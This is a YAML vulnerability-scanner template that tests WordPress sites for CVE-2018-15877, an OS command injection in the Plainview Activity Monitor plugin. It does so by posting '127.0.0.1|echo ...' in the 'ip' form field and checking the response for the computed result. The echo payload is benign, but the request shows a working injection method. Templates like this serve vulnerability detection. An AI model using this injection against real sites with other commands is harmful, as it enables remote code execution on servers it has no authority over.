name: poc-yaml-wp-cve-2018-15877
set:
  r: randomInt(10000,20000)
  r1: randomInt(10000,20000)
rules:
  - method: POST
    path: "/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools"
    headers:
      Content-Type: multipart/form-data; boundary=---------------------------163071102027796
    body: |
      -----------------------------163071102027796
      Content-Disposition: form-data; name="ip"

      127.0.0.1|echo $(({{r}}-{{r1}}))
      -----------------------------163071102027796
      Content-Disposition: form-data; name="lookup"

      Lookup
      -----------------------------163071102027796--
    expression: |
      status == 200 && body.bcontains(bytes(string(r-r1)))

detail:
  author: violin
  WP Activity Monitor: version <= 20161228
  links:
    - https://www.exploit-db.com/exploits/45274